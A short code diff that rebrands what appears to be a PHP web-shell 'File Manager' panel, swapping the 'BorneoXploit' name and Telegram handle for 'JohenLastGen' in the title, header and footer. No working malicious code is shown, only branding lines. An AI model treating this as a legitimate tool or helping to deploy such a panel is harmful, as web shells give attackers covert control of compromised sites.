@@ -1178,7 +1178,7 @@ if (function_exists('litespeed_request_headers')) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>File Manager - BorneoXploit</title>
+<title>File Manager - JohenLastGen</title>
 <style>
 :root {
     --bg: #0a0a1a;
@@ -1748,7 +1748,7 @@ body {
     <div class="header-left">
         <img src="https://i.ibb.co/1JwBpRzD/photo-2025-08-26-10-00-46.jpg" class="header-logo" alt="">
         <div>
-            <div class="header-title">Borneo File Manager </div>
+            <div class="header-title">JohenLastGen File Manager </div>
             <div class="header-sub">File Manager v1.0</div>
         </div>
     </div>
@@ -1935,7 +1935,7 @@ body {
 <footer class="app-footer">
     <div class="footer-content">
         <img src="https://i.ibb.co/1JwBpRzD/photo-2025-08-26-10-00-46.jpg" class="footer-avatar" alt="">
-        <div class="footer-text"><span>Contact Telegram</span> @borneoxploit404</div>
+        <div class="footer-text"><span>Contact Telegram</span> @johenlastgen</div>
     </div>
 </footer>
 
